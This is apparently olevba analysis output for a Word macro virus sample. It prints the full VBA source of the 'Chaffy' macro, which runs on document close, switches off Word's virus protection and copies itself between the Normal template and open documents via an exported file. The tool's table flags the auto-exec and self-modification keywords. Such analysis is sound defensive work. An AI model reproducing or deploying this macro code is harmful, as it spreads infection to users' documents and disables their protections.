olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Fs.t
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Fs.t - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Chaffy.bas 
in file: ./Virus.MSWord.Fs.t - OLE stream: 'Macros/VBA/Chaffy'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Copyright (C) 1998 by FlyShadow ~^^~ - Chaffy
Sub AutoClose()
    On Error Resume Next
    Options.VirusProtection = 0
    Options.SaveNormalPrompt = 0
    Set Јh = NormalTemplate.VBProject.VBComponents
    Set Јo = ActiveDocument.VBProject.VBComponents
    Select Case я
        Case Јh("Chaffy").Name
            Јo("Chaffy").Export "C:\Chaffy.lnk": Set Ј = Јh
        Case Јo("Chaffy").Name
            Јh("Chaffy").Export "C:\Chaffy.lnk": Set Ј = Јo
        Case Else
            Exit Sub
    End Select
        Ј.Import "C:\Chaffy.lnk"
        ActiveDocument.Save
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|IOC       |Chaffy.lnk          |Executable file name                         |
+----------+--------------------+---------------------------------------------+

